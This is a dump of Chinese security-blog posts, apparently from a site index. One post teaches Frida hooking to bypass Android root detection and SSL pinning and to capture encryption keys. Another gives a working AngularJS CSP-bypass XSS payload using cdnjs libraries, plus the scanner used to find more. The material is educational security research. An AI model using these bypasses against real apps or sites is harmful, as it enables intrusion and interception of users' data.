&#125;) &#125; setImmediate(run) 接著就看你想要 hook 什麼樣的方法，以我們剛剛的程式碼來說，先用 Java.use 拿到想要 hook 的 class，再用 MainActivity.onCreate.implementation 把原本的實作換成我們自己定義的 function。 那為什麼 hook 之後 app 就掛掉了呢？因為我們自己實作的 function 除了 log 以外什麼都沒做，也就是說原本的 onCreate 該做的事情都被拿掉了，所以 crash 也是合情合理，想知道 crash 的根本原因可以 adb logcat | grep AndroidRuntime 一下： android.util.SuperNotCalledException: Activity &#123;com.cymetrics.demo/com.cymetrics.demo.MainActivity&#125; did not call through to super.onCreate() 那我們應該怎麼做呢？只要記得在最後面呼叫原本的實作即可，這樣寫： function run() &#123; Java.perform(() => &#123; var MainActivity = Java.use('com.cymetrics.demo.MainActivity') MainActivity.onCreate.implementation = function() &#123; console.log('MainActivity onCreate') this.onCreate.call(this) &#125; &#125;) &#125; setImmediate(run) this 會是原本的 MainActivity，透過 this.onCreate.call 可以呼叫到原本的實作，而 call 這個方法第一個要傳入的參數就是 this，後面傳入參數。 執行上面腳本之後，會出現另外一個錯誤： Error: onCreate(): argument types do not match any of: .overload('android.os.Bundle') 這是因為 onCreate 其實應該是有帶參數的，只是我們覆蓋的時候沒有接收參數，因此就出錯了。為了避免這個問題，我會建議在覆蓋實作的時候在前面加上 .overload()，像這樣： MainActivity.onCreate.overload().implementation = function() &#123; &#125; Frida 就會再次出現錯誤訊息提示你正確的參數應該是什麼，就可以照著做，最後會像這樣： function run() &#123; Java.perform(() => &#123; var MainActivity = Java.use('com.cymetrics.demo.MainActivity') MainActivity.onCreate.overload('android.os.Bundle').implementation = function(a) &#123; console.log('MainActivity onCreate') this.onCreate.call(this, a) &#125; &#125;) &#125; setImmediate(run) 如此一來，就能知道參數是什麼，在呼叫原本的實作時也能帶入參數，就不會出錯了。 既然都可以插入程式碼了，我們可以做一大堆事情，像是直接在 UI 上面顯示一個新的訊息： function run() &#123; Java.perform(() => &#123; var MainActivity = Java.use('com.cymetrics.demo.MainActivity') MainActivity.onCreate.overload('android.os.Bundle').implementation = function(a) &#123; console.log('MainActivity onCreate') // Toast 一定要跑在 main thread(UI thread) Java.scheduleOnMainThread(function() &#123; var Toast = Java.use(\"android.widget.Toast\"); var currentApplication = Java.use('android.app.ActivityThread').currentApplication(); // Toast 的第一個參數需要 context 才能執行 var context = currentApplication.getApplicationContext(); Toast.makeText( context, // 這個參數的型態要正確，直接傳字串會出錯 Java.use(\"java.lang.String\").$new(\"Hello!\"), Toast.LENGTH_SHORT.value ).show(); &#125;); this.onCreate.call(this, a) &#125; &#125;) &#125; setImmediate(run) 程式碼來自：makeToast.js。 使用 Frida 繞過 root 檢測我們在之前的文章中繞過 root 檢測時，是直接去改 smali 的程式碼，直接把檢測的 function 給 patch 掉，藉此來繞過。有了 Frida 以後，就不需要去改 smali 的程式碼了，可以直接 hook 檢測的 function 並且把實作替換掉即可，像是這樣： function run() &#123; Java.perform(() => &#123; var RootBeer = Java.use('com.scottyab.rootbeer.RootBeer') RootBeer.isRooted.overload().implementation = function()&#123; console.log('bypass rootbeer') return false &#125;; &#125;) &#125; setImmediate(run) 沒錯，就是這麼容易。 那你可能會問說，我們是怎麼知道要 hook 這個 function 的？這部分還是需要靠靜態分析，從靜態分析中我們得知是這個 function 在做檢測，所以用 Frida 來 hook 這個 function。 我自己的話通常是兩個搭配使用，先反組譯之後靜態分析，稍微看一下程式碼，接著再用 Frida 去 hook，看能不能做到想做的事情，如果可以的話，我會再去改 smali 相對應的地方，然後把 app 重新打包，這樣就可以在沒有 Frida 的手機上也執行我想要的流程。 其實 Frida 的基礎使用就是這樣了，剩下的就是靠著對於程式碼以及 Android 開發的理解，決定要 hook 哪一個 function。 其他 Frida 小技巧底下列幾個我從網路上找到的 Frida 小技巧，都是實務上我有用到的，供大家參考。 印出 stack trace假設某個 app 有檢查機制，會偵測是不是有 root，然後原始碼經過混淆所以比較難追蹤，但是在檢查時會用 Log.d 輸出檢查相關資訊，這時候我們可以 hook Log.d，並且利用 Log.getStackTraceString 輸出 stack trace，就能知道是在哪邊呼叫這個 function： var Log = Java.use(\"android.util.Log\"); var Exception = Java.use(\"java.lang.Exception\"); Log.d.overload(\"java.lang.String\", \"java.lang.String\").implementation = function (a, b) &#123; // 發現輸出 root 偵測資訊的時候 if (b.indexOf('root') >= 0) &#123; // 印出 stack trace 方便追蹤 console.log(Log.getStackTraceString( Exception.$new())); &#125; return this.d.overload(\"java.lang.String\", \"java.lang.String\").call(this, a, b) &#125;; hook Reflect 相關方法在 Java 中除了直接呼叫方法以外，也可以透過反射（Reflect）的方式去呼叫，有些混淆的程式會大量運用這種技巧來加強靜態分析的難度，我們可以把每一個動態呼叫的方法都印出來，看看有沒有什麼蛛絲馬跡： // hook Class.forName var JavaClass = Java.use('java.lang.Class'); JavaClass.forName.overload('java.lang.String', 'boolean', 'java.lang.ClassLoader').implementation = function(name, b, c) &#123; console.log('Class.forName', name) // 還可以印出特定 class 底下所有的方法 if (name.indexOf('cymetrics') === 0) &#123; var TargetClass = Java.use(name); var methodsList = TargetClass.class.getDeclaredMethods(); for (var k=0; k&lt;methodsList.length; k++)&#123; console.log(methodsList[k].getName()); &#125; &#125; return this.forName.overload('java.lang.String', 'boolean', 'java.lang.ClassLoader').call(this, name, b, c) &#125; // hook Method.invoke，知道動態呼叫了哪些方法 var Method = Java.use('java.lang.reflect.Method') Method.invoke.overload('java.lang.Object', '[Ljava.lang.Object;').implementation = function(a,b)&#123; console.log('reflect', a, b) return this.invoke.call(this,a,b) &#125; hook 字串操作有些混淆程式會把程式中寫死的字串全都透過各種步驟打亂，讓人不易搜尋，例如說把字串變成數字然後再還原之類的，而在還原的時候通常都會經過字串操作，這時候我們可以直接去 hook 字串操作，並搭配前面提過的 stack trace 去追蹤： ['java.lang.StringBuilder', 'java.lang.StringBuffer'].forEach(function(clazz, i) &#123; Java.use(clazz)['toString'].implementation = function() &#123; var ret = this.toString(); console.log('ret:', ret) return ret; &#125; &#125;); hook 加解密相關操作通常在 Android App 裡面要進行加解密的話，都會透過內建的 API 來進行，像是這樣（來源：Android中的AES加密–上）： public static final String CODE_TYPE = \"UTF-8\"; public static final String AES_TYPE = \"AES/ECB/PKCS5Padding\"; private static final String AES_KEY=\"1111222233334444\"; public static String encrypt(String cleartext) &#123; try &#123; SecretKeySpec key = new SecretKeySpec(AES_KEY.getBytes(), \"AES\"); Cipher cipher = Cipher.getInstance(AES_TYPE); cipher.init(Cipher.ENCRYPT_MODE, key); byte[] encryptedData = cipher.doFinal(cleartext.getBytes(CODE_TYPE)); return Base64.encodeToString(encryptedData,Base64.DEFAULT); &#125; catch (Exception e) &#123; e.printStackTrace(); return \"\"; &#125; &#125; 所以只要能 hook 像是 SecretKeySpec 或是 doFinal 這些方法，就能夠攔截到 key 跟加密前的明文。 這篇文章值得一看：How Secure is your Android Keystore Authentication ?，裡面有附了一堆加解密相關的 Frida 腳本，在這裡：https://github.com/FSecureLABS/android-keystore-audit/blob/master/frida-scripts/tracer-cipher.js 話說腳本裡面沒有直接把 byte array 轉成字串，這邊提供一個比較方便的方式（來源：frida小技巧之string与byte转化）： function bytesToString(bytes) &#123; var javaString = Java.use('java.lang.String'); return javaString.$new(bytes); &#125; var Base64 = Java.use('android.util.Base64') Base64.decode.overload('[B', 'int').implementation = function(a, b) &#123; console.log(bytesToString(a)) return this.decode.call(this, a, b) &#125; SSL Pinning之前看到一篇 Defeating Android Certificate Pinning with Frida 裡面有附了一段很讚的腳本，自動去 hook 各種會做 SSL pinning 的 function，讓你繞過這個機制，存一份備份在這裡：https://gist.github.com/aszx87410/f7ae60826d436d8e5bd17deb3e40c249 存檔以後這樣跑起來： frida -U --no-pause -l ssl.js -f &quot;com.example&quot; 偵測 Frida既然 Frida 這麼強大，那有些 app 的安全機制自然而然想把它擋下來，一旦偵測到 Frida 的蹤跡，就直接退出 app 或是製造當機，可以參考底下這兩篇： Android逆向 多种特征检测 Frida 多种特征检测 Frida 而反偵測的方式有很多種，其中一種就是去 hook 上面文章提到的各種方法，畢竟我們有 root 權限又有 Frida hook 在前，所以只要我們知道是怎麼判斷的，就一定可以把檢查拿掉。如果找不出檢查的地方，可以利用上面提到的各種 hook 抽絲剝繭，慢慢找出來。 結語在這篇裡面我們介紹了 Frida 的基本使用，學習如何使用 Frida 來 hook 各種方法，藉此來得到各種我們想要的資訊。 而前四篇我們涵蓋了一些基本的東西，包括： 基本的 Android App 組成 如何用 Apktool 把 apk 拆開並裝回去 如何用 jadx 把 smali 還原成 java 檔 熟悉一點點 smali 的語法，知道如何改 code 以及加 code 如何透過電腦上的 proxy 攔截封包 如何改造 apk，讓 proxy 能夠順利攔截 如何使用 Frida 來 hook function 各種 Frida 的小技巧 再往後走的話，就要進入 native 的領域了。 除了使用 Java 撰寫 Android App 以外，也可以使用 Android NDK，就可以用 C&#x2F;C++ 撰寫程式碼，提供給 Android app 使用。 什麼情況會需要用到呢？第一是比較耗效能的地方，例如說圖片辨識之類的，用 C++ 來寫會比 Java 來得快，所以通常會用 native 來做，第二則是一些比較隱密的操作，例如說加解密，如果放在 Java 層，很容易就能反編譯並且看出在做什麼，用 native 來寫的話會需要更多 binary 相關知識才能破解。 除此之外，現實世界中的 app 並不像我們前面示範的 app 這麼簡單，可能經過加殼或是更強程度的混淆，就算 apk 拆得開，只要殼拆不掉，就看不到真正的邏輯。有些殼也具有反竄改跟反動態分析的機制，能夠把功力不足的攻擊者們阻擋在外，相關的介紹可以參考 2019 台灣資安週的議程：打造⼀一個安全與便利性兼具的 App 安全防護產品 這個系列之所以叫做「入門」，就是因為完全沒有提到這些實戰上會接觸的東西，只專注於入門的基礎跟工具；話雖如此，對於沒有特殊混淆或是加殼的 app，這樣應該就足夠了。 參考資料： 《FRIDA操作手册》 翻译——N种脱壳安卓恶意软件的方式 这恐怕是学习Frida最详细的笔记了 frida-snippets Frida Tutorial 实用FRIDA进阶：内存漫游、hook anywhere、抓包","link":"/2023/04/27/android-apk-decompile-intro-4/"},{"title":"自動化尋找 AngularJS CSP Bypass 中 prototype.js 的替代品","text":"在我之前的文章：從 cdnjs 的漏洞來看前端的供應鏈攻擊與防禦裡面有提過可以藉由 cdnjs 來繞過 CSP，而有其中一種繞過手法必須搭配 prototype.js 才能成功。 在理解原理之後，我開始好奇在 cdnjs 上面是否還有其他 library 可以做到類似的事情，因此就開始著手研究。 這篇會從 cdnjs 的 CSP 繞過開始講，講到為什麼需要 prototype.js，接著再提到我怎麼從 cdnjs 上找到它的替代品。 cdnjs + AngularJS CSP bypass在 CSP 裡面放上 https://cdnjs.cloudflare.com 其實是很危險的一件事情，因為有一個許多人都知道的方式，可以繞過這個 CSP。 詳情可參考這兩篇文章： Bypassing path restriction on whitelisted CDNs to circumvent CSP protections - SECT CTF Web 400 writeup H5SC Minichallenge 3: “Sh*t, it’s CSP!” 實際的繞過方式如下： &lt;html lang=\"en\"> &lt;head> &lt;meta charset=\"utf-8\"> &lt;title>CSP bypass&lt;/title> &lt;meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'none'; script-src https://cdnjs.cloudflare.com\"> &lt;/head> &lt;body> &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js\">&lt;/script> &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js\">&lt;/script> &lt;div ng-app ng-csp> &#123;&#123;$on.curry.call().alert('xss')&#125;&#125; &lt;/div> &lt;/body> &lt;/html> 因為 CSP 中有 cdnjs，所以我們可以引入其他的 library，這邊我們挑的是 AngularJS，引入了以後我們就可以用 CSTI 的方式注入底下這一段： &lt;div ng-app ng-csp> &#123;&#123;$on.curry.call().alert('xss')&#125;&#125; &lt;/div> 這邊為什麼是 $on.curry.call() 呢？你可以把它換成 window 看看，會發現沒有反應，這是因為 AngularJS 的 expression 是放在一個 scope object 裡面，你沒辦法直接存取到 window 或是 window 上的屬性。 而這邊有另一個重點是 CSP 沒有開 unsafe-eval，所以你也不能直接 constructor.constructor(&#39;alert(1)&#39;)() 之類的。 從最後的結果看起來，$on.curry.call() 似乎等同於 window，那是為什麼呢？這就是 prototype.js 派上用場的地方了，我們來看一下它的部分原始碼，src&#x2F;prototype&#x2F;lang&#x2F;function.js： function curry() &#123; if (!arguments.length) return this; var __method = this, args = slice.call(arguments, 0); return function() &#123; var a = merge(args, arguments); return __method.apply(this, a); &#125; &#125; 這個 function 會加在 Function.prototype 上面，而重點其實只有第一行： if (!arguments.length) return this;，如果沒有帶參數的話，會直接回傳 this。在 JavaScript 裡面，如果你用 call 或是 apply 來呼叫函式的話，第一個參數可以指定 this 的值，如果沒有傳的話就會是預設值，在嚴格模式底下是 undefined，非嚴格模式底下是 window。 這也是為什麼 $on.curry.call() 會是 window，因為 $on 是個 function，所以呼叫 $on.curry.call() 的時候，由於 this 沒帶所以預設是 window，參數也沒帶，因此 curry 這個函式就會根據第一行的條件句，把 this 也就是 window 回傳回來。 總結一下，之所以 AngularJS 需要 prototype.js 的幫忙，是因為 prototype.js： 提供了一個加在 prototype 上的函式 而且這個函式會回傳 this 第一點很重要，因為前面有提過在 expression 裡面沒辦法存取到 window，所以一般的 library 加的東西其實也是拿不到的，但 prototype.js 是把東西放在 prototype 上面，所以可以透過 prototype 來存取到新增的 method。 第二點也很重要，搭配 this 預設會是 window 這個特性，就可以讓我們拿到 window。 知道了原理之後，就知道該怎麼找替代品了，只要找到有相同功能的就好了。而此時我突然想到以前寫過的一篇文章：Don’t break the Web：以 SmooshGate 以及 keygen 為例，在裡面我有提到因為 MooTools 習慣在 prototype 上面新增東西，導致原本要叫做 flatten 的 method 只好改名叫 flat（後來看 maple 的 writeup 才知道原來 Array.prototype.includes 不叫 Array.prototype.contains 也是因為 MooTools） 那會不會 MooTools 也符合我們上面的條件呢？ 手動找出替代品之 MooTools我們可以在這個資料夾中找出 MooTools 改的各種 prototype：https://github.com/mootools/mootools-core/tree/master/Source/Types 裡面有： Array DOMEvent Function Number Object String 因為檔案都不大，所以可以一個一個看，想更快的話也可以直接用 return this 當作關鍵字來搜尋，結果隨便一找就找到兩個： Array.implement(&#123; erase: function(item)&#123; for (var i = this.length; i--;)&#123; if (this[i] === item) this.splice(i, 1); &#125; return this; &#125;, empty: function()&#123; this.length = 0; return this; &#125;, &#125;) Array.prototype.erase 跟 Array.prototype.empty 兩個函式都會回傳 this，所以底下兩個方法都可以拿到 window： [].erase.call() [].empty.call() 接著馬上來試試看 CSP bypass 是否成功： &lt;html lang=\"en\"> &lt;head> &lt;meta charset=\"utf-8\"> &lt;title>CSP bypass - MooTools&lt;/title> &lt;meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'none'; script-src https://cdnjs.cloudflare.com\"> &lt;/head> &lt;body> &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js\">&lt;/script> &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js\">&lt;/script> &lt;div ng-app ng-csp> &#123;&#123;[].erase.call().alert('xss')&#125;&#125; &lt;/div> &lt;/body> &lt;/html> 打開網頁之後發現確實有跳出 alert，果然成功了！ 既然確認手動找得到以後，就可以來想想看怎麼自動化了。 自動化尋找替代品一個滿簡單直覺的自動化流程大概就是： 找出 cdnjs 上面所有的 library 找出每個 library 的所有 JS 檔案 用 headless browser（我用 puppeteer）來測試每個 JS 是否會在 prototype 上新增屬性 嘗試呼叫新增的屬性，看是否會回傳 window 其中有一些細節的部分端看個人想要怎麼處理，例如說更精緻一點的話可以針對套件的所有版本都做測試，但是那樣做的話測試量可能會變五到十倍，由於我只是想做個初步的研究，所以不考慮套件版本，一律使用最新版的。 此外，除了找到可以回傳 this 的方法以外，我也想看有哪些套件會去動你的 prototype，這個可以從第三步的結果得知。 最後，我這邊只找「沒帶參數呼叫以後會回傳 this 的方法」，但可能會有那種參數符合特定條件才回會傳 this 的，這些需要人工去看，所以我先不考慮。 找出 cdnjs 上所有的 library去 cdnjs 的網站上面觀察一下，可以發現背後是去呼叫放在 algolia 的 API，algolia 其實有提供把所有資料拉回來的方法，但官網的 api key 不支援，然後分頁的話又會受到限制，只能拿到前 1000 筆結果。 於是，我找到了 search 的 API，先假設每個字母開頭的套件不會超過 1000 個，就可以從 a-zA-Z0-9 去尋找以每個字母開頭的套件，藉此繞過 1000 筆的限制，讀到所有套件的資料。 程式碼的實作大概是這樣： const axios = require('axios') const fs = require('fs'); const API_HOST = 'https://2qwlvlxzb6-dsn.algolia.net/' const SEARCH_API_URL = '/1/indexes/libraries/query' const API_KEY = '2663c73014d2e4d6d1778cc8ad9fd010' const APP_ID = '2QWLVLXZB6' const instance = axios.create(&#123; baseURL: API_HOST, headers: &#123; 'x-algolia-api-key': API_KEY, 'x-algolia-application-id': APP_ID &#125; &#125;) const sleep = ms => new Promise(resolve => setTimeout(resolve, ms)) function write(content) &#123; fs.writeFileSync('./data/libs.json', content) &#125; async function main() &#123; let chars = 'abcdefghijklmnopqrstuvwxyz0123456789'.split('') let allItems = [] let existLib = &#123;&#125; for(let char of chars) &#123; console.log(`fetching $&#123;char&#125;`) try &#123; await sleep(500) const data = await getLibraries(char) const hits = data.hits console.log('length:', hits.length) const filtered = [] for(let item of hits) &#123; if (!existLib[item.name]) &#123; filtered.push(item) &#125; existLib[item.name] = true &#125; allItems = allItems.concat(filtered) console.log('filtered length:', filtered.length) console.log('total length:', allItems.length) write(JSON.stringify(allItems, null, 2)) &#125; catch(err) &#123; console.log('Error!') console.log(err, err.toString()) &#125; &#125; &#125; async function getLibraries(keyword) &#123; const response = await instance.post(SEARCH_API_URL, &#123; params: `query=$&#123;keyword&#125;&amp;page=0&amp;hitsPerPage=1000`, restrictSearchableAttributes: [ 'name' ] &#125;) return response.data &#125; main() 跑完以後，我們就可以拿到一個有所有 cdnjs 套件跟名稱的列表。 找出每個 library 的所有 JS 檔案套件的基本資料是放在 algolia，但是一些細節則是放在 cdnjs 自己的 API。 而這個 API 的規則也很簡單，網址就是：https://api.cdnjs.com/libraries/$&#123;套件名稱&#125;/$&#123;版本&#125;，所以只要把上一步的列表整理一下拿去打 API，就可以拿到每一個套件有哪些檔案： const axios = require('axios') const fs = require('fs'); const sleep = ms => new Promise(resolve => setTimeout(resolve, ms)) function write(content) &#123; fs.writeFileSync('./data/libDetail.json', content) &#125; if (!fs.existsSync('./data/libDetail.json')) &#123; write('[]') &#125; const existMap = &#123;&#125; let detailItems = JSON.parse(fs.readFileSync('./data/libDetail.json', 'utf8')) for(let item of detailItems) &#123; existMap[item.name] = true &#125; async function getDetail(libName, version) &#123; const url = `https://api.cdnjs.com/libraries/$&#123;encodeURIComponent(libName)&#125;/$&#123;version&#125;` try &#123; const response = await axios(url) return response.data &#125; catch(err) &#123; console.log(url) console.log('failed:', libName, err.message) //process.exit(1) &#125; &#125; async function getLib(libraries, lib) &#123; console.log('fetching:', lib.name) const detail = await getDetail(lib.name, lib.version) if (!detail) return detailItems.push(detail) write(JSON.stringify(detailItems, null, 2)) console.log(`progress: $&#123;detailItems.length&#125;/$&#123;libraries.length&#125;`) &#125; async function getFiles() &#123; const libraries = JSON.parse(fs.readFileSync('./data/libs.json', 'utf8')) for(let lib of libraries) &#123; if (existMap[lib.name]) continue await sleep(200) getLib(libraries, lib) &#125; &#125; async function main() &#123; getFiles() &#125; main() 找出符合條件的套件套件列表有了，每個套件有哪些檔案也有了。接著來到我們的最後一步：找出符合條件的套件。 在 cdnjs 上的套件有 4000 多個，如果一個一個跑的話，那就必須跑 4000 多遍，但其實符合我們條件的應該是少數，所以我選擇 10 個一組去跑，原因是 10 個套件的檔案應該不至於到真的太多，不用怕載入時間很長。如果這 10 個套件都沒有更動 prototype，那就下一組，如果有的話，就用類似二分搜的方式去找出哪些套件有改動到。 而偵測的 HTML 大概長這樣： &lt;!DOCTYPE html> &lt;html lang=\"en\"> &lt;head> &lt;meta charset=\"utf-8\"> &lt;script> function getPrototypeFunctions(prototype) &#123; return Object.getOwnPropertyNames(prototype) &#125; var protos = &#123; array: getPrototypeFunctions(Array.prototype), string: getPrototypeFunctions(String.prototype), number: getPrototypeFunctions(Number.prototype), object: getPrototypeFunctions(Object.prototype), function: getPrototypeFunctions(Function.prototype) &#125; &lt;/script> &lt;/head> &lt;body> &lt;!-- insert script here --> &lt;script src=\"...\">&lt;/script> &lt;!-- insert script here --> &lt;script> var newProtos = &#123; array: getPrototypeFunctions(Array.prototype), string: getPrototypeFunctions(String.prototype), number: getPrototypeFunctions(Number.prototype), object: getPrototypeFunctions(Object.prototype), function: getPrototypeFunctions(Function.prototype) &#125; let result = &#123; prototypeFunctions: [], functionsReturnWindow: [] &#125; function check() &#123; checkPrototype('array', 'Array.prototype', Array.prototype) checkPrototype('string', 'String.prototype', String.prototype) checkPrototype('number', 'Number.prototype', Number.prototype) checkPrototype('object', 'Object.prototype', Object.prototype) checkPrototype('function', 'Function.prototype', Function.prototype) return result &#125; function checkPrototype(name, prototypeName, prototype) &#123; const oldFuncs = protos[name] const newFuncs = newProtos[name] for(let fnName of newFuncs) &#123; if (!oldFuncs.includes(fnName)) &#123; const fullName = prototypeName + '.' + fnName result.prototypeFunctions.push(fullName) try &#123; if (prototype[fnName].call() === window) &#123; result.functionsReturnWindow.push(fullName) &#125; &#125; catch(err) &#123; &#125; &#125; &#125; &#125; &lt;/script> &lt;/body> &lt;/html> 我們在套件還沒載入時，先記錄起每個 prototype 上面的屬性，載入套件以後再記錄一次然後跟之前做比對，就可以找出哪些是套件引入後才新增的屬性。然後我們也可以把結果分成兩種，一種是只要有改動到 prototype 就記下來，另外一種則是呼叫以後會回傳 window 的。 整個測試的程式碼比較長一點，完整版在這邊：https://github.com/aszx87410/cdnjs-prototype-pollution/blob/main/scan.js 但流程大概就是： 每十個套件一組，找出會汙染 prototype 的套件 找出套件後，再找出到底是哪些檔案會汙染 prototype 印出結果 研究結果在 4290 個套件中，有 74 個（1.72%）套件會在 prototype 上面新增屬性，清單如下： 6to5@3.6.5 Colors.js@1.2.4 Embetty@3.0.8 NicEdit@0.93 RGraph@606 ScrollTrigger@1.0.5 TableExport@5.2.0 ajv-async@1.0.1 angular-vertxbus@6.4.1 asciidoctor.js@1.5.9 aurelia-script@1.5.2 blendui@0.0.4 blissfuljs@1.0.6 bootstrap-calendar@0.2.5 carto.js@4.2.2 cignium-hypermedia-client@1.35.0 core-js@3.24.1 custombox@4.0.3 d3fc@11.0.0 d3plus@2.0.1 datejs@1.0 deb.js@0.0.2 defiant.js@2.2.7 eddy@0.7.0 ext-core@3.1.0 extjs@6.2.0 fs-tpp-api@2.4.4 highcharts@10.2.0 inheritance-js@0.4.12 jo@0.4.1 jquery-ajaxy@1.6.1 jquery-ui-bootstrap@0.5pre js-bson@2.0.8 jslite@1.1.12 json-forms@1.6.3 keras-js@0.3.0 kwargsjs@1.0.1 leaflet.freedraw@2.0.1 lobipanel@1.0.6 melonjs@1.0.1 metro@4.4.3 mo@1.7.3 monet@0.9.3 mootools@1.6.0 oidc-client@1.11.5 opal@0.3.43 prototype@1.7.3 qcobjects@2.3.69 qoopido.demand@8.0.2 qoopido.js@3.7.4 qoopido.nucleus@3.2.15 quantumui@1.2.0 rantjs@1.0.6 rita@2.8.1 rivescript@2.2.0 scriptaculous@1.9.0 should.js@13.2.3 simple-gallery-js@1.0.3 simplecartjs@3.0.5 strapdown-topbar@1.6.4 string_score@0.1.22 survey-angular@1.9.45 survey-jquery@1.9.45 survey-knockout@1.9.45 survey-react@1.9.45 survey-vue@1.9.45 tablefilter@2.5.0 tmlib.js@0.5.2 tui-editor@1.4.10 typeis@1.1.2 uppy@3.0.0 vanta@0.5.22 waud.js@1.0.3 zui@1.10.0 而這 74 個中，有 12 個（16.2%）符合我們的條件，直接呼叫會回傳 this，清單如下： [ &#123; \"url\": \"https://cdnjs.cloudflare.com/ajax/libs/asciidoctor.js/1.5.9/asciidoctor.min.js\", \"functions\": [ \"Array.prototype.$concat\", \"Array.prototype.$push\", \"Array.prototype.$append\", \"Array.prototype.$rotate!\", \"Array.prototype.$shuffle!\", \"Array.prototype.$sort\", \"Array.prototype.$to_a\", \"Array.prototype.$to_ary\", \"Array.prototype.$unshift\", \"Array.prototype.$prepend\", \"String.prototype.$initialize\", \"String.prototype.$chomp\", \"String.prototype.$force_encoding\", \"Function.prototype.$to_proc\" ] &#125;, &#123; \"url\": \"https://cdnjs.cloudflare.com/ajax/libs/jquery-ui-bootstrap/0.5pre/third-party/jQuery-UI-Date-Range-Picker/js/date.js\", \"functions\": [ \"Number.prototype.milliseconds\", \"Number.prototype.millisecond\", \"Number.prototype.seconds\", \"Number.prototype.second\", \"Number.prototype.minutes\", \"Number.prototype.minute\", \"Number.prototype.hours\", \"Number.prototype.hour\", \"Number.prototype.days\", \"Number.prototype.day\", \"Number.prototype.weeks\", \"Number.prototype.week\", \"Number.prototype.months\", \"Number.prototype.month\", \"Number.prototype.years\", \"Number.prototype.year\" ] &#125;, &#123; \"url\": \"https://cdnjs.cloudflare.com/ajax/libs/ext-core/3.1.0/ext-core.min.js\", \"functions\": [ \"Function.prototype.createInterceptor\" ] &#125;, &#123; \"url\": \"https://cdnjs.cloudflare.com/ajax/libs/datejs/1.0/date.min.js\", \"functions\": [ \"Number.prototype.milliseconds\", \"Number.prototype.millisecond\", \"Number.prototype.seconds\", \"Number.prototype.second\", \"Number.prototype.minutes\", \"Number.prototype.minute\", \"Number.prototype.hours\", \"Number.prototype.hour\", \"Number.prototype.days\", \"Number.prototype.day\", \"Number.prototype.weeks\", \"Number.prototype.week\", \"Number.prototype.months\", \"Number.prototype.month\", \"Number.prototype.years\", \"Number.prototype.year\" ] &#125;, &#123; \"url\": \"https://cdnjs.cloudflare.com/ajax/libs/json-forms/1.6.3/js/brutusin-json-forms.min.js\", \"functions\": [ \"String.prototype.format\" ] &#125;, &#123; \"url\": \"https://cdnjs.cloudflare.com/ajax/libs/inheritance-js/0.4.12/inheritance.min.js\", \"functions\": [ \"Object.prototype.mix\", \"Object.prototype.mixDeep\" ] &#125;, &#123; \"url\": \"https://cdnjs.cloudflare.com/ajax/libs/melonjs/1.0.1/melonjs.min.js\", \"functions\": [ \"Array.prototype.remove\" ] &#125;, &#123; \"url\": \"https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core-compat.min.js\", \"functions\": [ \"Array.prototype.erase\", \"Array.prototype.empty\", \"Function.prototype.extend\", \"Function.prototype.implement\", \"Function.prototype.hide\", \"Function.prototype.protect\" ] &#125;, &#123; \"url\": \"https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js\", \"functions\": [ \"Array.prototype.erase\", \"Array.prototype.empty\", \"Function.prototype.extend\", \"Function.prototype.implement\", \"Function.prototype.hide\", \"Function.prototype.protect\" ] &#125;, &#123; \"url\": \"https://cdnjs.cloudflare.com/ajax/libs/opal/0.3.43/opal.min.js\", \"functions\": [ \"Array.prototype.$extend\", \"Array.prototype.$to_proc\", \"Array.prototype.$to_a\", \"Array.prototype.$collect!\", \"Array.prototype.$delete_if\", \"Array.prototype.$each_index\", \"Array.prototype.$fill\", \"Array.prototype.$insert\", \"Array.prototype.$keep_if\", \"Array.prototype.$map!\", \"Array.prototype.$push\", \"Array.prototype.$shuffle\", \"Array.prototype.$to_ary\", \"Array.prototype.$unshift\", \"String.prototype.$as_json\", \"String.prototype.$extend\", \"String.prototype.$intern\", \"String.prototype.$to_sym\", \"Number.prototype.$as_json\", \"Number.prototype.$extend\", \"Number.prototype.$to_proc\", \"Number.prototype.$downto\", \"Number.prototype.$nonzero?\", \"Number.prototype.$ord\", \"Number.prototype.$times\", \"Function.prototype.$include\", \"Function.prototype.$module_function\", \"Function.prototype.$extend\", \"Function.prototype.$to_proc\" ] &#125;, &#123; \"url\": \"https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.3/prototype.min.js\", \"functions\": [ \"Array.prototype.clear\", \"Number.prototype.times\", \"Function.prototype.curry\" ] &#125;, &#123; \"url\": \"https://cdnjs.cloudflare.com/ajax/libs/tmlib.js/0.5.2/tmlib.min.js\", \"functions\": [ \"Array.prototype.swap\", \"Array.prototype.eraseAll\", \"Array.prototype.eraseIf\", \"Array.prototype.eraseIfAll\", \"Array.prototype.clear\", \"Array.prototype.shuffle\", \"Number.prototype.times\", \"Number.prototype.upto\", \"Number.prototype.downto\", \"Number.prototype.step\", \"Object.prototype.$extend\", \"Object.prototype.$safe\", \"Object.prototype.$strict\" ] &#125; ] 扣掉開頭講的 prototype.js，我們還有其他 11 個套件可以搭配使用，讓我們繞過限制，順利拿到 window。 總結透過把 cdnjs 上的套件資料都抓下來，以及使用 headless browser 幫忙驗證，我們成功找到了 11 個 prototype.js 的替代品，這些套件都會在 prototype 上面新增方法，而且呼叫這些方法以後都會回傳 this，可以藉由呼叫它來取得 window。 從開始執行到產出結果，大概花了一兩天而已，因為資料格式相對單純，驗證方式也很單純，數量也沒有說真的很多，想加速的話也可以多開幾個 thread 來跑。 另外，找出替代品其實也沒什麼太大的意義，只是好奇而已，因為通常也不會有網頁特別去擋 prototype.js，所以其實只要找到一個可以拿到 window 的套件就足夠了。 但總之這個研究的過程還是滿好玩的。 完整程式碼：https://github.com/aszx87410/cdnjs-prototype-pollution","link":"/2022/09/01/angularjs-csp-bypass-cdnjs/"},{"title":"AWS Lambda + GitHub API + Google Sheet = 自動化簽到系統","text":"前言這一年間我利用閒暇之餘嘗試進行了幾場教學實驗，希望能透過持續的教學改進自己的教材，從學生的反饋當中得到一些心得。 